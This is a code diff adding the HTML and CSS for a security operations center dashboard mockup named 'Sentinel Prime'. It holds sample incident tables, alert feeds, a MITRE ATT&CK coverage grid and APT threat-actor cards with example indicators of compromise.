+.text-cyan    { color: var(--cyan);   }
+.text-red     { color: var(--red);    }
+.text-amber   { color: var(--amber);  }
+.text-green   { color: var(--green);  }
+.text-purple  { color: var(--purple); }
+.text-muted   { color: var(--text-muted); }
+.text-mono    { font-family: var(--font-mono); }
+.text-display { font-family: var(--font-display); }
+.mt-8  { margin-top: 8px;  }
+.mt-12 { margin-top: 12px; }
+.mt-16 { margin-top: 16px; }
+.mb-8  { margin-bottom: 8px;  }
+.mb-12 { margin-bottom: 12px; }
+.section-gap { margin-bottom: 14px; }
+.flex  { display: flex; }
+.flex-center { display: flex; align-items: center; }
+.flex-between { display: flex; align-items: center; justify-content: space-between; }
+.gap-6  { gap: 6px;  }
+.gap-8  { gap: 8px;  }
+.gap-10 { gap: 10px; }
+.gap-12 { gap: 12px; }
+.font-mono { font-family: var(--font-mono); }
+.font-display { font-family: var(--font-display); }
+.fw-600 { font-weight: 600; }
+.fs-10  { font-size: 10px; }
+.fs-11  { font-size: 11px; }
+.fs-12  { font-size: 12px; }
+.fs-13  { font-size: 13px; }
+
+.separator { height: 1px; background: var(--border-base); margin: 12px 0; }
+
+.empty-state {
+  text-align: center;
+  padding: 30px 20px;
+  color: var(--text-muted);
+  font-family: var(--font-mono);
+  font-size: 12px;
+}
+
+/* ─── ANIMATED COUNTER ─── */
+.counter { display: inline-block; }
+
+/* ─── LOADING INDICATOR ─── */
+.loading-bar {
+  height: 2px;
+  background: linear-gradient(90deg, transparent, var(--cyan), transparent);
+  animation: loading 1.5s infinite;
+  margin-bottom: 12px;
+}
+@keyframes loading {
+  0%   { transform: translateX(-100%); }
+  100% { transform: translateX(100%);  }
+}
+
+/* SCROLLBAR inside card */
+.card-scroll {
+  max-height: 280px;
+  overflow-y: auto;
+}
+
+/* ─── RESPONSIVE ─── */
+@media (max-width: 1200px) {
+  .kpi-grid { grid-template-columns: repeat(3, 1fr); }
+  .sidebar  { width: 56px; }
+  .nav-item span { display: none; }
+  .nav-badge { display: none; }
+  .sidebar-label { display: none; }
+  .sidebar-footer { display: none; }
+  .brand-sub { display: none; }
+}
+</style>
+</head>
+<body>
+
+<div class="app-shell">
+
+  <!-- ═══════════════════════════════════════════════════════
+       TOP BAR
+  ═══════════════════════════════════════════════════════ -->
+  <header class="topbar">
+    <div class="brand">
+      <div class="brand-icon">
+        <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <polygon points="16,2 30,10 30,22 16,30 2,22 2,10" fill="none" stroke="#00d4ff" stroke-width="1.5" opacity="0.6"/>
+          <polygon points="16,7 25,12 25,20 16,25 7,20 7,12" fill="rgba(0,212,255,0.08)" stroke="#00d4ff" stroke-width="1"/>
+          <circle cx="16" cy="16" r="4" fill="rgba(0,212,255,0.3)" stroke="#00d4ff" stroke-width="1"/>
+          <line x1="16" y1="7" x2="16" y2="12" stroke="#00d4ff" stroke-width="0.8" opacity="0.6"/>
+          <line x1="16" y1="20" x2="16" y2="25" stroke="#00d4ff" stroke-width="0.8" opacity="0.6"/>
+          <line x1="25" y1="12" x2="20.7" y2="14.5" stroke="#00d4ff" stroke-width="0.8" opacity="0.6"/>
+          <line x1="11.3" y1="17.5" x2="7" y2="20" stroke="#00d4ff" stroke-width="0.8" opacity="0.6"/>
+          <line x1="25" y1="20" x2="20.7" y2="17.5" stroke="#00d4ff" stroke-width="0.8" opacity="0.6"/>
+          <line x1="11.3" y1="14.5" x2="7" y2="12" stroke="#00d4ff" stroke-width="0.8" opacity="0.6"/>
+        </svg>
+      </div>
+      <div>
+        <div class="brand-name">SENTINEL PRIME</div>
+        <div class="brand-sub">ENTERPRISE SECURITY OPERATIONS PLATFORM v4.2.0</div>
+      </div>
+    </div>
+
+    <div class="topbar-status">
+      <div class="status-chip"><div class="status-dot red"></div>THREAT LEVEL: ELEVATED</div>
+      <div class="status-chip"><div class="status-dot green"></div>ALL SENSORS ACTIVE</div>
+      <div class="status-chip"><div class="status-dot cyan"></div>SIEM CONNECTED</div>
+      <div class="status-chip"><div class="status-dot amber"></div>7 OPEN INCIDENTS</div>
+    </div>
+
+    <div class="topbar-right">
+      <div class="live-clock" id="liveClock">2025-01-15 | 14:22:37 UTC</div>
+      <div class="alert-badge" onclick="showTab('alerts')">
+        <div class="alert-bell">🔔</div>
+        <div class="alert-count" id="alertCount">23</div>
+      </div>
+      <div class="user-chip">
+        <div class="user-avatar">CSP</div>
+        <div class="user-info">
+          <div class="user-name">Ciprian Stefan Plesca</div>
+          <div class="user-role">CHIEF INFORMATION SECURITY OFFICER</div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="main-wrapper">
+
+    <!-- ═══════════════════════════════════════════════════
+         SIDEBAR
+    ═══════════════════════════════════════════════════ -->
+    <aside class="sidebar">
+      <div class="sidebar-section">
+        <div class="sidebar-label">OPERATIONS</div>
+        <div class="nav-item active" onclick="showTab('dashboard')">
+          <div class="nav-icon">⬡</div>
+          <span>Dashboard</span>
+        </div>
+        <div class="nav-item" onclick="showTab('threats')">
+          <div class="nav-icon">⚠</div>
+          <span>Threat Intel</span>
+          <div class="nav-badge">14</div>
+        </div>
+        <div class="nav-item" onclick="showTab('incidents')">
+          <div class="nav-icon">🔥</div>
+          <span>Incidents</span>
+          <div class="nav-badge">7</div>
+        </div>
+        <div class="nav-item" onclick="showTab('alerts')">
+          <div class="nav-icon">🔔</div>
+          <span>SIEM Alerts</span>
+          <div class="nav-badge">23</div>
+        </div>
+      </div>
+
+      <div class="sidebar-section">
+        <div class="sidebar-label">ASSESSMENT</div>
+        <div class="nav-item" onclick="showTab('vulnerabilities')">
+          <div class="nav-icon">🛡</div>
+          <span>Vulnerabilities</span>
+          <div class="nav-badge amber">189</div>
+        </div>
+        <div class="nav-item" onclick="showTab('assets')">
+          <div class="nav-icon">💻</div>
+          <span>Assets</span>
+          <div class="nav-badge green">2847</div>
+        </div>
+        <div class="nav-item" onclick="showTab('ueba')">
+          <div class="nav-icon">👤</div>
+          <span>UEBA</span>
+          <div class="nav-badge amber">31</div>
+        </div>
+        <div class="nav-item" onclick="showTab('network')">
+          <div class="nav-icon">🌐</div>
+          <span>Network</span>
+        </div>
+      </div>
+
+      <div class="sidebar-section">
+        <div class="sidebar-label">GOVERNANCE</div>
+        <div class="nav-item" onclick="showTab('compliance')">
+          <div class="nav-icon">✔</div>
+          <span>Compliance</span>
+        </div>
+        <div class="nav-item" onclick="showTab('hunting')">
+          <div class="nav-icon">🔍</div>
+          <span>Threat Hunting</span>
+        </div>
+        <div class="nav-item" onclick="showTab('reports')">
+          <div class="nav-icon">📊</div>
+          <span>Executive Report</span>
+        </div>
+      </div>
+
+      <div class="sidebar-footer">
+        <div class="threat-level-box">
+          <div class="tl-label">GLOBAL THREAT LEVEL</div>
+          <div class="tl-value">ELEVATED</div>
+          <div class="tl-sub">Score: 7.4 / 10 — HIGH</div>
+        </div>
+      </div>
+    </aside>
+
+    <!-- ═══════════════════════════════════════════════════
+         CONTENT AREA
+    ═══════════════════════════════════════════════════ -->
+    <main class="content">
+
+      <!-- ════════════════════════════════════════
+           TAB: DASHBOARD
+      ════════════════════════════════════════ -->
+      <div class="tab-pane active" id="tab-dashboard">
+        <div class="page-header">
+          <div>
+            <div class="page-title">SECURITY OPERATIONS CENTER</div>
+            <div class="page-subtitle">REAL-TIME THREAT MONITORING // ENTERPRISE COMMAND CENTER</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-ghost">⟳ REFRESH</button>
+            <button class="btn btn-red">🔴 INCIDENT RESPONSE</button>
+            <button class="btn btn-cyan">⬇ EXPORT REPORT</button>
+          </div>
+        </div>
+
+        <!-- KPI ROW -->
+        <div class="kpi-grid">
+          <div class="kpi-card danger">
+            <div class="kpi-icon">⚡</div>
+            <div class="kpi-label">CRITICAL THREATS</div>
+            <div class="kpi-value" id="kpi-crit">14</div>
+            <div class="kpi-delta up">▲ 3 vs yesterday</div>
+          </div>
+          <div class="kpi-card warning">
+            <div class="kpi-icon">🔥</div>
+            <div class="kpi-label">ACTIVE INCIDENTS</div>
+            <div class="kpi-value">7</div>
+            <div class="kpi-delta up">▲ 2 new today</div>
+          </div>
+          <div class="kpi-card info">
+            <div class="kpi-icon">🛡</div>
+            <div class="kpi-label">ALERTS (24H)</div>
+            <div class="kpi-value" id="kpi-alerts">2,341</div>
+            <div class="kpi-delta down">▼ 8% vs avg</div>
+          </div>
+          <div class="kpi-card warning">
+            <div class="kpi-icon">🔓</div>
+            <div class="kpi-label">OPEN CVEs</div>
+            <div class="kpi-value">189</div>
+            <div class="kpi-delta up">▲ 12 unpatched</div>
+          </div>
+          <div class="kpi-card success">
+            <div class="kpi-icon">✓</div>
+            <div class="kpi-label">MEAN TIME TO DETECT</div>
+            <div class="kpi-value">4.2<span style="font-size:12px;font-weight:400;color:var(--text-muted);">min</span></div>
+            <div class="kpi-delta down">▼ 22% improved</div>
+          </div>
+          <div class="kpi-card purple">
+            <div class="kpi-icon">👤</div>
+            <div class="kpi-label">RISKY USERS</div>
+            <div class="kpi-value">31</div>
+            <div class="kpi-delta up">▲ 5 new flags</div>
+          </div>
+        </div>
+
+        <!-- ROW 2 -->
+        <div class="grid-7-3 section-gap">
+          <!-- Alert trend chart -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot red"></div>ALERT VOLUME — 30 DAYS</div>
+              <div class="card-actions">
+                <button class="btn btn-ghost" style="font-size:10px;padding:3px 8px;">1D</button>
+                <button class="btn btn-cyan" style="font-size:10px;padding:3px 8px;">30D</button>
+                <button class="btn btn-ghost" style="font-size:10px;padding:3px 8px;">90D</button>
+              </div>
+            </div>
+            <div class="card-body">
+              <div style="position:relative;height:180px;">
+                <canvas id="alertTrendChart" role="img" aria-label="Alert volume trend over 30 days showing critical, high and medium alerts">Alert volume trend chart</canvas>
+              </div>
+            </div>
+          </div>
+
+          <!-- Threat origin -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot red"></div>TOP THREAT ORIGINS</div>
+            </div>
+            <div class="card-body" style="padding:10px 14px;">
+              <div class="threat-origin-list">
+                <div class="to-item">
+                  <div class="to-flag">🇨🇳</div>
+                  <div class="to-country">China (CN)</div>
+                  <div class="to-bar"><div class="progress-bar"><div class="progress-fill pf-red" style="width:87%"></div></div></div>
+                  <div class="to-count">1,247</div>
+                </div>
+                <div class="to-item">
+                  <div class="to-flag">🇷🇺</div>
+                  <div class="to-country">Russia (RU)</div>
+                  <div class="to-bar"><div class="progress-bar"><div class="progress-fill pf-red" style="width:71%"></div></div></div>
+                  <div class="to-count">1,019</div>
+                </div>
+                <div class="to-item">
+                  <div class="to-flag">🇰🇵</div>
+                  <div class="to-country">North Korea (KP)</div>
+                  <div class="to-bar"><div class="progress-bar"><div class="progress-fill pf-amber" style="width:44%"></div></div></div>
+                  <div class="to-count">634</div>
+                </div>
+                <div class="to-item">
+                  <div class="to-flag">🇮🇷</div>
+                  <div class="to-country">Iran (IR)</div>
+                  <div class="to-bar"><div class="progress-bar"><div class="progress-fill pf-amber" style="width:32%"></div></div></div>
+                  <div class="to-count">462</div>
+                </div>
+                <div class="to-item">
+                  <div class="to-flag">🇧🇷</div>
+                  <div class="to-country">Brazil (BR)</div>
+                  <div class="to-bar"><div class="progress-bar"><div class="progress-fill pf-cyan" style="width:18%"></div></div></div>
+                  <div class="to-count">261</div>
+                </div>
+                <div class="to-item">
+                  <div class="to-flag">🇺🇦</div>
+                  <div class="to-country">Ukraine (UA)</div>
+                  <div class="to-bar"><div class="progress-bar"><div class="progress-fill pf-cyan" style="width:14%"></div></div></div>
+                  <div class="to-count">198</div>
+                </div>
+                <div class="to-item">
+                  <div class="to-flag">🇳🇬</div>
+                  <div class="to-country">Nigeria (NG)</div>
+                  <div class="to-bar"><div class="progress-bar"><div class="progress-fill pf-purple" style="width:11%"></div></div></div>
+                  <div class="to-count">157</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ROW 3 -->
+        <div class="grid-6-4 section-gap">
+          <!-- Recent incidents -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot red"></div>RECENT INCIDENTS</div>
+              <button class="btn btn-ghost" style="font-size:10px;padding:3px 8px;" onclick="showTab('incidents')">VIEW ALL →</button>
+            </div>
+            <table class="data-table">
+              <thead>
+                <tr>
+                  <th>ID</th>
+                  <th>INCIDENT</th>
+                  <th>SEV</th>
+                  <th>STATUS</th>
+                  <th>ASSIGNED</th>
+                  <th>TIME</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td class="text-mono text-cyan">INC-2024-1847</td>
+                  <td><span class="fw-600">Ransomware detected on PROD-DB-01</span></td>
+                  <td><span class="sev sev-critical">CRITICAL</span></td>
+                  <td><span class="status status-active">Active</span></td>
+                  <td class="text-secondary">A. Mitchell</td>
+                  <td class="text-mono text-muted">02:14:07 ago</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-cyan">INC-2024-1846</td>
+                  <td><span class="fw-600">Lateral movement — Finance subnet</span></td>
+                  <td><span class="sev sev-critical">CRITICAL</span></td>
+                  <td><span class="status status-active">Active</span></td>
+                  <td class="text-secondary">J. Torres</td>
+                  <td class="text-mono text-muted">04:51:22 ago</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-cyan">INC-2024-1845</td>
+                  <td><span class="fw-600">Privilege escalation — svcadmin account</span></td>
+                  <td><span class="sev sev-high">HIGH</span></td>
+                  <td><span class="status status-contained">Contained</span></td>
+                  <td class="text-secondary">K. Osei</td>
+                  <td class="text-mono text-muted">07:18:45 ago</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-cyan">INC-2024-1844</td>
+                  <td><span class="fw-600">Phishing campaign targeting Exec team</span></td>
+                  <td><span class="sev sev-high">HIGH</span></td>
+                  <td><span class="status status-active">Active</span></td>
+                  <td class="text-secondary">S. Kim</td>
+                  <td class="text-mono text-muted">09:03:11 ago</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-cyan">INC-2024-1843</td>
+                  <td><span class="fw-600">DNS tunneling detected — R&D segment</span></td>
+                  <td><span class="sev sev-high">HIGH</span></td>
+                  <td><span class="status status-active">Active</span></td>
+                  <td class="text-secondary">R. Patel</td>
+                  <td class="text-mono text-muted">11:47:33 ago</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-cyan">INC-2024-1842</td>
+                  <td><span class="fw-600">Data exfiltration attempt — 48GB via FTP</span></td>
+                  <td><span class="sev sev-critical">CRITICAL</span></td>
+                  <td><span class="status status-contained">Contained</span></td>
+                  <td class="text-secondary">A. Mitchell</td>
+                  <td class="text-mono text-muted">14:22:58 ago</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <!-- Alert severity breakdown -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot amber"></div>ALERT SEVERITY BREAKDOWN</div>
+            </div>
+            <div class="card-body">
+              <div style="position:relative;height:160px;">
+                <canvas id="sevPieChart" role="img" aria-label="Alert severity distribution pie chart showing critical, high, medium and low alerts">Severity breakdown</canvas>
+              </div>
+              <div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:12px;font-size:11px;font-family:var(--font-mono);">
+                <span style="display:flex;align-items:center;gap:4px;"><span style="width:9px;height:9px;border-radius:2px;background:#ff3355;display:inline-block;"></span>Critical 14%</span>
+                <span style="display:flex;align-items:center;gap:4px;"><span style="width:9px;height:9px;border-radius:2px;background:#ffaa00;display:inline-block;"></span>High 28%</span>
+                <span style="display:flex;align-items:center;gap:4px;"><span style="width:9px;height:9px;border-radius:2px;background:#ffcc44;display:inline-block;"></span>Medium 38%</span>
+                <span style="display:flex;align-items:center;gap:4px;"><span style="width:9px;height:9px;border-radius:2px;background:#00ff88;display:inline-block;"></span>Low 20%</span>
+              </div>
+            </div>
+
+            <div class="separator" style="margin:0 14px;"></div>
+
+            <div class="card-body">
+              <div class="sparkline-row">
+                <div class="sp-name">Malware Detections</div>
+                <div class="sp-bar"><div class="sp-fill pf-red" style="width:72%"></div></div>
+                <div class="sp-val text-red">289</div>
+              </div>
+              <div class="sparkline-row">
+                <div class="sp-name">Brute Force Attacks</div>
+                <div class="sp-bar"><div class="sp-fill pf-amber" style="width:58%"></div></div>
+                <div class="sp-val text-amber">231</div>
+              </div>
+              <div class="sparkline-row">
+                <div class="sp-name">C2 Beaconing</div>
+                <div class="sp-bar"><div class="sp-fill pf-red" style="width:44%"></div></div>
+                <div class="sp-val text-red">175</div>
+              </div>
+              <div class="sparkline-row">
+                <div class="sp-name">Policy Violations</div>
+                <div class="sp-bar"><div class="sp-fill pf-purple" style="width:35%"></div></div>
+                <div class="sp-val text-purple">139</div>
+              </div>
+              <div class="sparkline-row">
+                <div class="sp-name">Recon / Port Scans</div>
+                <div class="sp-bar"><div class="sp-fill pf-cyan" style="width:28%"></div></div>
+                <div class="sp-val text-cyan">111</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ROW 4: Activity feed + MITRE -->
+        <div class="grid-2 section-gap">
+          <!-- Activity feed -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot green"></div>LIVE ACTIVITY FEED</div>
+              <span class="text-mono text-muted" style="font-size:10px;">LAST 60 MIN</span>
+            </div>
+            <div class="card-body" style="max-height:220px;overflow-y:auto;">
+              <div class="timeline">
+                <div class="tl-item">
+                  <div class="tl-dot red"></div>
+                  <div class="tl-content">
+                    <div class="tl-time">14:21:44 UTC</div>
+                    <div class="tl-text"><strong>CRITICAL:</strong> Ransomware payload dropped on PROD-DB-01 (10.1.44.12). Process: <code style="font-size:10px;color:var(--amber)">svchost.exe</code> → <code style="font-size:10px;color:var(--amber)">wsmprovhost.exe</code>. Encrypted 2,847 files in 4 mins.</div>
+                  </div>
+                </div>
+                <div class="tl-item">
+                  <div class="tl-dot red"></div>
+                  <div class="tl-content">
+                    <div class="tl-time">14:19:02 UTC</div>
+                    <div class="tl-text"><strong>ALERT:</strong> C2 beacon to <span class="ioc-tag red">185.220.101.47</span> detected from host WORKST-FIN-042. Interval: 300s. TLS encrypted.</div>
+                  </div>
+                </div>
+                <div class="tl-item">
+                  <div class="tl-dot amber"></div>
+                  <div class="tl-content">
+                    <div class="tl-time">14:15:31 UTC</div>
+                    <div class="tl-text"><strong>HIGH:</strong> Failed authentication surge detected. 847 failed logins against LDAP from 192.168.5.0/24 in 120 seconds. Blocked by WAF.</div>
+                  </div>
+                </div>
+                <div class="tl-item">
+                  <div class="tl-dot amber"></div>
+                  <div class="tl-content">
+                    <div class="tl-time">14:11:18 UTC</div>
+                    <div class="tl-text"><strong>HIGH:</strong> Suspicious PowerShell execution on WORKST-EXEC-007. Encoded command with base64 payload. User: <span class="text-amber">c.parker@corp.com</span></div>
+                  </div>
+                </div>
+                <div class="tl-item">
+                  <div class="tl-dot cyan"></div>
+                  <div class="tl-content">
+                    <div class="tl-time">14:07:55 UTC</div>
+                    <div class="tl-text"><strong>INFO:</strong> Vulnerability scan completed. 12 new CVEs identified. 3 marked CRITICAL. Asset: DEV-CLUSTER-04.</div>
+                  </div>
+                </div>
+                <div class="tl-item">
+                  <div class="tl-dot red"></div>
+                  <div class="tl-content">
+                    <div class="tl-time">14:03:42 UTC</div>
+                    <div class="tl-text"><strong>CRITICAL:</strong> Lateral movement detected. User account <span class="text-red">svcadmin</span> authenticated to 14 internal hosts within 8 mins. T1021.001 (RDP).</div>
+                  </div>
+                </div>
+                <div class="tl-item">
+                  <div class="tl-dot green"></div>
+                  <div class="tl-content">
+                    <div class="tl-time">13:58:14 UTC</div>
+                    <div class="tl-text"><strong>RESOLVED:</strong> INC-2024-1841 closed. DLP false positive confirmed. 14 email quarantine releases approved by Security Analyst.</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- MITRE ATT&CK Coverage -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot cyan"></div>MITRE ATT&CK COVERAGE</div>
+              <button class="btn btn-ghost" style="font-size:10px;padding:3px 8px;">FULL MATRIX →</button>
+            </div>
+            <div class="card-body">
+              <div style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);margin-bottom:10px;letter-spacing:0.5px;">14 TACTICS // 142 TECHNIQUES MONITORED</div>
+              <div style="display:grid;grid-template-columns:repeat(7,1fr);gap:3px;margin-bottom:12px;">
+                <!-- Tactic mini cells -->
+                <div style="background:rgba(255,51,85,0.25);border:1px solid rgba(255,51,85,0.5);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--red);letter-spacing:0.3px;">RECON</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--red);">7</div>
+                </div>
+                <div style="background:rgba(255,170,0,0.15);border:1px solid rgba(255,170,0,0.4);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--amber);">RESOURCE</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--amber);">5</div>
+                </div>
+                <div style="background:rgba(255,170,0,0.15);border:1px solid rgba(255,170,0,0.4);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--amber);">INITIAL</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--amber);">9</div>
+                </div>
+                <div style="background:rgba(255,51,85,0.2);border:1px solid rgba(255,51,85,0.5);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--red);">EXEC</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--red);">12</div>
+                </div>
+                <div style="background:rgba(0,212,255,0.08);border:1px solid rgba(0,212,255,0.25);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--cyan);">PERSIST</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--cyan);">14</div>
+                </div>
+                <div style="background:rgba(0,212,255,0.08);border:1px solid rgba(0,212,255,0.25);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--cyan);">PRIV ESC</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--cyan);">13</div>
+                </div>
+                <div style="background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.2);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--cyan);">DEF EVA</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--cyan);">19</div>
+                </div>
+                <div style="background:rgba(153,102,255,0.1);border:1px solid rgba(153,102,255,0.3);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--purple);">CRED</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--purple);">11</div>
+                </div>
+                <div style="background:rgba(153,102,255,0.1);border:1px solid rgba(153,102,255,0.3);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--purple);">DISCOV</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--purple);">16</div>
+                </div>
+                <div style="background:rgba(255,51,85,0.2);border:1px solid rgba(255,51,85,0.5);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--red);">LATERAL</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--red);">9</div>
+                </div>
+                <div style="background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.2);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--cyan);">COLLECT</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--cyan);">9</div>
+                </div>
+                <div style="background:rgba(255,51,85,0.2);border:1px solid rgba(255,51,85,0.5);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--red);">C2</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--red);">14</div>
+                </div>
+                <div style="background:rgba(255,170,0,0.15);border:1px solid rgba(255,170,0,0.4);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--amber);">EXFIL</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--amber);">8</div>
+                </div>
+                <div style="background:rgba(255,51,85,0.25);border:1px solid rgba(255,51,85,0.6);border-radius:2px;padding:4px 3px;text-align:center;">
+                  <div style="font-family:var(--font-mono);font-size:8px;color:var(--red);">IMPACT</div>
+                  <div style="font-family:var(--font-display);font-size:14px;color:var(--red);">16</div>
+                </div>
+              </div>
+              <div style="display:flex;align-items:center;gap:8px;font-size:11px;color:var(--text-muted);font-family:var(--font-mono);">
+                <div class="progress-bar" style="flex:1;height:6px;"><div class="progress-fill pf-green" style="width:78%"></div></div>
+                <span>78% COVERAGE</span>
+                <span style="color:var(--cyan);">142/182 techniques</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: THREAT INTELLIGENCE
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-threats">
+        <div class="page-header">
+          <div>
+            <div class="page-title">THREAT INTELLIGENCE CENTER</div>
+            <div class="page-subtitle">APT TRACKING // IOC MANAGEMENT // THREAT FEEDS // CVE CORRELATION</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-amber">⬆ INGEST FEED</button>
+            <button class="btn btn-cyan">⬇ EXPORT IOCS</button>
+          </div>
+        </div>
+
+        <div class="kpi-grid" style="grid-template-columns:repeat(4,1fr);">
+          <div class="kpi-card danger">
+            <div class="kpi-label">ACTIVE APT ACTORS</div>
+            <div class="kpi-value">14</div>
+            <div class="kpi-delta up">▲ 2 new campaigns</div>
+          </div>
+          <div class="kpi-card warning">
+            <div class="kpi-label">TOTAL IOCs</div>
+            <div class="kpi-value">48,291</div>
+            <div class="kpi-delta up">▲ 1,247 this week</div>
+          </div>
+          <div class="kpi-card info">
+            <div class="kpi-label">MATCHED IOCs (24H)</div>
+            <div class="kpi-value">2,847</div>
+            <div class="kpi-delta up">▲ 18% vs avg</div>
+          </div>
+          <div class="kpi-card purple">
+            <div class="kpi-label">THREAT FEEDS ACTIVE</div>
+            <div class="kpi-value">23</div>
+            <div class="kpi-delta neu">— All operational</div>
+          </div>
+        </div>
+
+        <div class="grid-6-4 section-gap">
+          <!-- APT Actors -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot red"></div>ACTIVE APT ACTORS — HIGH CONFIDENCE</div>
+              <button class="btn btn-ghost" style="font-size:10px;padding:3px 8px;">ALL 14 ACTORS →</button>
+            </div>
+            <div class="card-body" style="max-height:420px;overflow-y:auto;">
+              <div class="apt-card">
+                <div class="flex-between"><div class="apt-name">APT41 / WINNTI GROUP</div><span class="sev sev-critical">CRITICAL</span></div>
+                <div class="apt-ttps">Chinese state-sponsored. Dual espionage & cybercrime. Financial services, pharma, gaming. Currently targeting your R&D division.</div>
+                <div class="apt-meta">
+                  <div class="apt-tag">T1190 EXPLOIT</div><div class="apt-tag">T1078 VALID ACCTS</div><div class="apt-tag">T1021 RDP</div><div class="apt-tag">T1486 ENCRYPT</div>
+                </div>
+                <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
+                  <span class="ioc-tag red">185.220.101.47</span>
+                  <span class="ioc-tag red">23.83.133.224</span>
+                  <span class="ioc-tag amber">winnti.dll SHA256:3f4a...</span>
+                  <span class="ioc-tag purple">Domain: cdn-updates[.]com</span>
+                </div>
+              </div>
+              <div class="apt-card amber">
+                <div class="flex-between"><div class="apt-name">COZY BEAR / APT29</div><span class="sev sev-critical">CRITICAL</span></div>
+                <div class="apt-ttps">Russian SVR. Persistent access campaigns. Targets government, think tanks, healthcare. Supply-chain attacks via vendor compromise.</div>
+                <div class="apt-meta">
+                  <div class="apt-tag">T1195 SUPPLY CHAIN</div><div class="apt-tag">T1566 PHISHING</div><div class="apt-tag">T1550 PASS-HASH</div>
+                </div>
+                <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
+                  <span class="ioc-tag amber">194.68.44.53</span>
+                  <span class="ioc-tag amber">45.142.212.100</span>
+                  <span class="ioc-tag purple">wellmaildomain[.]com</span>
+                </div>
+              </div>
+              <div class="apt-card amber">
+                <div class="flex-between"><div class="apt-name">LAZARUS GROUP / APT38</div><span class="sev sev-high">HIGH</span></div>
+                <div class="apt-ttps">North Korean DPRK. Financial theft targeting SWIFT, cryptocurrency. Active ransomware deployment — BLINDINGCAN, FALLCHILL malware families.</div>
+                <div class="apt-meta">
+                  <div class="apt-tag">T1588 OBTAIN CAPAB</div><div class="apt-tag">T1055 INJECT</div><div class="apt-tag">T1485 DATA DESTR</div>
+                </div>
+              </div>
+              <div class="apt-card cyan">
+                <div class="flex-between"><div class="apt-name">SANDWORM TEAM / VOODOO BEAR</div><span class="sev sev-high">HIGH</span></div>
+                <div class="apt-ttps">Russian GRU Unit 74455. Critical infrastructure attacks. NotPetya, BlackEnergy, Industroyer capabilities observed in recent campaigns.</div>
+                <div class="apt-meta">
+                  <div class="apt-tag">ICS/SCADA</div><div class="apt-tag">T1561 DISK WIPE</div><div class="apt-tag">T1498 NET DOS</div>
+                </div>
+              </div>
+              <div class="apt-card cyan">
+                <div class="flex-between"><div class="apt-name">SCATTERED SPIDER</div><span class="sev sev-high">HIGH</span></div>
+                <div class="apt-ttps">UNC3944. English-speaking, social engineering specialists. SIM swapping, help desk vishing, MFA bypass. Ransomware deployment via BlackCat/ALPHV.</div>
